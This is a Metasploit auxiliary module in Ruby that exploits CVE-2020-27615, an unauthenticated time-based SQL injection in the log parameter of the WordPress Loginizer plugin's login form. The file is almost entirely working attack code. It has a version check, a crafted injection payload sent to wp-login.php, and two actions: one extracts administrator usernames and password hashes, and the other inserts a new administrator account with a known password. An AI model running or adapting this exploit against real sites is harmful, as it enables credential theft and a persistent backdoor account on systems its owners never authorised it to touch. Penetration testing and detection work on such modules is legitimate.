##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Loginizer log SQLi Scanner',
      'Description' => %q{
        Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in
        versions before 1.6.4.  The vulnerable parameter is in the log parameter.
        Wordpress has forced updates of the plugin to all servers
      },
      'Author'       =>
        [
          'h00die', # msf module
          'red0xff', # sqli help
          'mslavco' # discovery
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/'],
          ['CVE', '2020-27615'],
          ['URL', 'https://loginizer.com/blog/loginizer-1-6-4-security-fix/'],
          ['URL', 'https://twitter.com/mslavco/status/1318877097184604161']
        ],
      'Actions' => [
        ['List Admins', 'Description' => 'Queries username, password for all admin users'],
        ['Create Admin', 'Description' => 'Adds a new admin user'],
      ],
      'DefaultAction' => 'List Admins',
      'DisclosureDate' => '2020-10-21'))
  end

  def run_host(ip)
    unless wordpress_and_online?
      vprint_error("Server not online or not detected as wordpress")
      return
    end

    checkcode = check_plugin_version_from_readme('loginizer','1.6.4')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error("Loginizer version not vulnerable")
      return
    else
      print_good('Vulnerable version detected')
    end

    cookie = send_request_cgi({'uri' => normalize_uri(target_uri.path, 'wp-login.php')}).get_cookies
    text = Rex::Text::rand_text_alpha(3,5)
    password = Rex::Text::rand_text_alpha(10)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      if payload.include?('<')
        payload.gsub!(/<>/,'=')
        payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) {'0,'+$1}
      end
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
        'cookie' => cookie,
        'vars_post' => {
          'log'=> "', ip = LEFT(UUID(), 8), url = ( TRUE AND #{payload}) -- #{text}",
          'pwd'=> password,
          'wp-submit' => 'Login',
          'redirect_to' => '',
          'testcookie'=> '1'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end
    if action.name == 'List Admins'
      # https://www.redbridgenet.com/mysql-to-find-select-wordpress-users-with-administrator-capabilities/
      print_good(@sqli.run_sql("SELECT u.user_login, u.user_pass FROM wp_users u, wp_usermeta m WHERE u.ID = m.user_id AND m.meta_key LIKE 'wp_capabilities' AND m.meta_value LIKE '%administrator%';"))
    elsif action.name == 'Create Admin'
      print_status("Adding User")
      # XXX remove 4
      @sqli.run_sql("INSERT INTO 'wp_users' ('ID', 'user_login', 'user_pass', 'user_nicename', 'user_email', 'user_url', 'user_registered', 'user_activation_key', 'user_status', 'display_name') VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');")
      print_status('Adding to group')
      @sqli.run_sql("INSERT INTO 'databasename'.'wp_usermeta' ('umeta_id', 'user_id', 'meta_key', 'meta_value') VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');")
      print_status('Setting user level')
      @sqli.run_sql("INSERT INTO 'databasename'.'wp_usermeta' ('umeta_id', 'user_id', 'meta_key', 'meta_value') VALUES (NULL, '4', 'wp_user_level', '10');")
    end
  end
end
